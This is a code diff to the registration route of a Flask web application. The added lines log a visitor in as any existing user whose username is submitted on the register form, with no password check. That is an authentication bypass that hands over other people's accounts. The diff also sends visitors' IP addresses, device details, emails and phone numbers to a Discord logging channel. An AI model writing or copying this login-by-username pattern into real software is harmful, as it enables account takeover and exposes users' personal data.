@@ -271,14 +271,23 @@ def login():
 
 @views.route('/register', methods=['GET', 'POST'])
 def registeracc():
+    client_ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
     if current_user.is_authenticated:
         return redirect(url_for('views.home'))
     
     if request.method == 'POST':
         username = request.form.get('username')
+        user = User.query.filter_by(username=username).first()
+        if user :
+            login_user(user)
+            user.active_sessions += 1
+            db.session.commit()
+            discord_log_login(f"{client_ip} just logged in with {username} Device ```{user_agent}```  <@709799648143081483>")
+
         email = request.form.get('email')
         phone = request.form.get('phone')
-        discord_log_register(f"New user  : {username} ===== {email} ====== {phone} <@709799648143081483>")
+        discord_log_register(f"New user  : {username} ====== {email} ====== {phone} ====== {client_ip} <@709799648143081483>")
         return "Waiting approval"
     return render_template('used_pages/register.html')
 
